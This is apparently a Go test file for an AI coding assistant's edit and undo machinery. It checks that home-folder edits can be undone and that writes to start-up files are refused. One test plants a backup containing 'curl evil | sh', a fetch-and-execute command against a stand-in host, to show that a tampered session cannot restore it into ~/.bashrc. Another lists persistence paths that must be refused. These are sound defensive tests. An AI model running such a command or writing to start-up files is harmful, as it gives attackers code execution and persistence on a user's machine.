package main

import (
	"context"
	"encoding/json"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"mochiii/editapply"
)

// Writing in the user's home folder, outside the project: the undo half and
// the model-facing half. The prepare/apply half is tested in editapply.

// homeAndProject makes a fake $HOME with a project inside it, as on a real
// machine (~/Desktop/Neww), and returns both resolved.
func homeAndProject(t *testing.T) (home, project string) {
	t.Helper()
	h := t.TempDir()
	t.Setenv("HOME", h)
	t.Setenv("USERPROFILE", h) // what os.UserHomeDir reads on Windows
	home, err := editapply.RealHomeDir()
	if err != nil {
		t.Fatal(err)
	}
	project = filepath.Join(home, "Desktop", "Neww")
	if err := os.MkdirAll(project, 0o755); err != nil {
		t.Fatal(err)
	}
	return home, project
}

func applyAnywhere(t *testing.T, project, session string, block editapply.EditBlock) {
	t.Helper()
	p, err := editapply.PrepareEditAnywhere(project, block)
	if err != nil {
		t.Fatalf("PrepareEditAnywhere(%s): %v", block.FilePath, err)
	}
	if err := editapply.Apply(project, p, session); err != nil {
		t.Fatalf("Apply(%s): %v", block.FilePath, err)
	}
}

func quietLogger() *log.Logger { return log.New(io.Discard, "", 0) }

// One undo reverts everything the run did: a project edit, a new folder and
// file on the Desktop (removed, folder too), and an edited file in Documents
// (restored).
func TestUndoRevertsProjectAndHomeEditsTogether(t *testing.T) {
	home, project := homeAndProject(t)
	doc := filepath.Join(home, "Documents", "plan.txt")
	if err := os.MkdirAll(filepath.Dir(doc), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(doc, []byte("step one\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(project, "a.go"), []byte("package a\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	session, err := editapply.NewBackupSessionDir(project)
	if err != nil {
		t.Fatal(err)
	}
	applyAnywhere(t, project, session, editapply.EditBlock{FilePath: "a.go", Search: "package a", Replace: "package b"})
	applyAnywhere(t, project, session, editapply.EditBlock{FilePath: "~/Desktop/Go_chii/main.go", Replace: "package main\n"})
	applyAnywhere(t, project, session, editapply.EditBlock{FilePath: "~/Documents/plan.txt", Search: "step one", Replace: "step two"})

	restored, removed, guarded, err := runUndoSession(project, session, false, strings.NewReader(""), io.Discard, quietLogger())
	if err != nil {
		t.Fatalf("runUndoSession: %v", err)
	}
	if restored != 3 || removed != 1 || len(guarded) != 0 {
		t.Errorf("restored=%d removed=%d guarded=%v, want 3 reverted (1 of them removed), none guarded", restored, removed, guarded)
	}
	if got, _ := os.ReadFile(filepath.Join(project, "a.go")); string(got) != "package a\n" {
		t.Errorf("project file not restored: %q", got)
	}
	if got, _ := os.ReadFile(doc); string(got) != "step one\n" {
		t.Errorf("~/Documents/plan.txt not restored: %q", got)
	}
	if _, err := os.Stat(filepath.Join(home, "Desktop", "Go_chii")); !os.IsNotExist(err) {
		t.Errorf("~/Desktop/Go_chii still exists after undo (err=%v); the run created it", err)
	}
}

// A run that touched ONLY the home folder has no project before/ at all; undo
// must still revert it rather than fail on the missing half.
func TestUndoOfAHomeOnlyRun(t *testing.T) {
	home, project := homeAndProject(t)
	session, err := editapply.NewBackupSessionDir(project)
	if err != nil {
		t.Fatal(err)
	}
	applyAnywhere(t, project, session, editapply.EditBlock{FilePath: "~/Desktop/Go_chii/README.md", Replace: "hi\n"})

	_, removed, _, err := runUndoSession(project, session, false, strings.NewReader(""), io.Discard, quietLogger())
	if err != nil || removed != 1 {
		t.Fatalf("undo of a home-only run: removed=%d err=%v", removed, err)
	}
	if _, err := os.Stat(filepath.Join(home, "Desktop", "Go_chii")); !os.IsNotExist(err) {
		t.Errorf("~/Desktop/Go_chii survived undo (err=%v)", err)
	}
}

// A restore is a write: a tampered session cannot use undo to reach a place
// an edit could never have.
func TestUndoRefusesToRestoreIntoARefusedHomePath(t *testing.T) {
	home, project := homeAndProject(t)
	session, err := editapply.NewBackupSessionDir(project)
	if err != nil {
		t.Fatal(err)
	}
	planted := filepath.Join(session, editapply.OutsideBackupSubdir, "before", ".bashrc")
	if err := os.MkdirAll(filepath.Dir(planted), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(planted, []byte("curl evil | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	after := filepath.Join(session, editapply.OutsideBackupSubdir, "after", ".bashrc")
	_ = os.MkdirAll(filepath.Dir(after), 0o755)
	_ = os.WriteFile(after, []byte(""), 0o644)

	if _, _, _, err := runUndoSession(project, session, true, strings.NewReader(""), io.Discard, quietLogger()); err == nil {
		t.Error("undo restored into ~/.bashrc from a planted session")
	}
	if _, err := os.Stat(filepath.Join(home, ".bashrc")); !os.IsNotExist(err) {
		t.Errorf("~/.bashrc was written (err=%v)", err)
	}
}

// The model can propose a file on the Desktop, and cannot propose one in a
// start-up location. Proposals are validated, never applied, here.
func TestProposeEditAcceptsHomePathsAndRefusesStartupFiles(t *testing.T) {
	_, project := homeAndProject(t)
	s := &Server{cfg: &Config{}, workspace: project, logger: quietLogger()}
	propose := func(path string) (string, bool) {
		args, _ := json.Marshal(map[string]string{"path": path, "search": "", "replace": "x\n"})
		res, err := s.builtinProposeEdit(context.Background(), args, &proposalSink{})
		if err != nil {
			t.Fatalf("propose_edit(%s): %v", path, err)
		}
		return res.Content, res.IsError
	}
	if out, isErr := propose("~/Desktop/Go_chii/notes.md"); isErr {
		t.Errorf("a new file on the Desktop was refused: %s", out)
	}
	for _, bad := range []string{"~/.bashrc", "~/.config/autostart/x.desktop", "/etc/cron.d/x"} {
		if out, isErr := propose(bad); !isErr {
			t.Errorf("propose_edit(%s) was accepted: %s", bad, out)
		}
	}
}

// A refusal names the file the way the model wrote it, not relative to home.
func TestAnOutsideRefusalNamesTheHomePath(t *testing.T) {
	_, project := homeAndProject(t)
	_, err := editapply.PrepareEditAnywhere(project, editapply.EditBlock{FilePath: "~/Desktop/x.go", Replace: "not go"})
	if err == nil || !strings.HasPrefix(err.Error(), "~/Desktop/x.go") {
		t.Errorf("err = %v, want it to lead with ~/Desktop/x.go", err)
	}
}
